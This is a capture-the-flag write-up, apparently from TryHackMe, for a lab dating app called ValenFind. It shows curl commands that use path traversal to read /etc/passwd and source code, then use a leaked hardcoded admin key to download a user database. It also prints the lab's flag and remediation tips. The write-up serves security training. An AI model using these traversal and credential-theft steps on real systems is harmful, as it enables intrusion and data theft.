## **ValenFind CTF - Writeup** 🏆

### **Target Information**
- **IP Address:** `10.49.191.149`
- **Port:** `5000`
- **Application:** ValenFind (Dating Application)

---

## **Step 1: JavaScript Code Analysis** 🔍

Initially, I was given a JavaScript code snippet that revealed a potential vulnerability:

```javascript
function loadTheme(layoutName) {
    // Feature: Dynamic Layout Fetching
    // Vulnerability: 'layout' parameter allows LFI
    fetch(`/api/fetch_layout?layout=${layoutName}`)
        .then(r => r.text())
        .then(html => {
            // Client-side rendering
            document.getElementById('bio-container').innerHTML = html;
        });
}
```

The comment in the code clearly indicated **LFI (Local File Inclusion)** vulnerability in the `/api/fetch_layout` endpoint.

---

## **Step 2: Confirming LFI Vulnerability** 🕳️

I tested the LFI by trying to read the `/etc/passwd` file:

```bash
curl "http://10.49.191.149:5000/api/fetch_layout?layout=../../../../etc/passwd"
```

**Output:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
...
```

✅ **LFI confirmed working!**

---

## **Step 3: Reading Application Source Code** 📄

Since I knew the application was Python-based, I tried to read the main application file. An error message revealed the exact path:

```bash
curl "http://10.49.191.149:5000/api/fetch_layout?layout=../../../../usr/bin/python3"
```

**Error message revealed:**
```
Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/components/../../../../usr/bin/python3'
```

This exposed the **base directory**: `/opt/Valenfind/`

Now I could read the source code:

```bash
curl "http://10.49.191.149:5000/api/fetch_layout?layout=../../../../opt/Valenfind/app.py"
```

---

## **Step 4: Source Code Analysis** 🔎

The source code contained critical information:

```python
# Admin API key - hardcoded!
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"

# Database file
DATABASE = 'cupid.db'

# Admin endpoint for database export
@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    if auth_header == ADMIN_API_KEY:
        return send_file(DATABASE, as_attachment=True, download_name='valenfind_leak.db')
```

**Key findings:**
- ✅ Admin API key exposed: `CUPID_MASTER_KEY_2024_XOXO`
- ✅ Database export endpoint: `/api/admin/export_db`
- ✅ Database file name: `cupid.db`

---

## **Step 5: Database Extraction** 💾

Using the exposed admin key, I downloaded the database:

```bash
curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
     "http://10.49.191.149:5000/api/admin/export_db" \
     --output valenfind.db
```

✅ **Database downloaded successfully!**

---

## **Step 6: Finding the Flag** 🚩

I opened the database and checked the users table:

```bash
sqlite3 valenfind.db
```

```sql
.tables
SELECT * FROM users;
```

**Output:**
```
id | username | password | real_name | email | phone | address | bio | likes | avatar
1  | romeo_montague | juliet123 | Romeo Montague | romeo@verona.cupid | ... | Looking for my Juliet | 14 | romeo.jpg
2  | casanova_official | secret123 | Giacomo Casanova | loverboy@venice.kiss | ... | Just here for the free chocolate | 5 | casanova.jpg
...
8  | cupid | admin_root_x99 | System Administrator | cupid@internal.cupid | ... | FLAG: THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a} | 999 | cupid.jpg
```

**User "cupid" had the flag in their bio!** 🎯

---

## **Step 7: Login Confirmation** 🔑

I logged into the application using the credentials found in the database:

- **Username:** `cupid`
- **Password:** `admin_root_x99`

The flag was visible on the profile page, confirming the find.

---

## **Final Flag** 🏁

```
THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
```

---

## **Attack Summary** 📋

| Step | Action | Result |
|------|--------|--------|
| 1 | JavaScript code analysis | Identified LFI vulnerability |
| 2 | LFI test with `/etc/passwd` | Confirmed LFI working |
| 3 | Read source code via LFI | Found base path `/opt/Valenfind/` |
| 4 | Analyzed `app.py` | Discovered admin API key and DB export endpoint |
| 5 | Downloaded database using admin key | Got `valenfind.db` |
| 6 | Queried database | Found flag in "cupid" user's bio |
| 7 | Logged in with credentials | Verified flag |

---

## **Vulnerabilities Found** ⚠️

1. **LFI (Local File Inclusion)** - `layout` parameter allowed path traversal
2. **Hardcoded Credentials** - Admin API key exposed in source code
3. **Plaintext Passwords** - No password hashing implemented
4. **Insecure Database Export** - Admin endpoint accessible with simple token

---

## **Remediation Tips** 🔒

1. **Input Validation** - Block path traversal sequences like `../`
2. **Environment Variables** - Store API keys in `.env` file, not in source code
3. **Password Hashing** - Use bcrypt or Argon2 for password storage
4. **Proper Authentication** - Implement strong authentication for admin endpoints
5. **Error Handling** - Don't expose system paths in error messages

---

**Flag captured successfully!** ✅
 THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
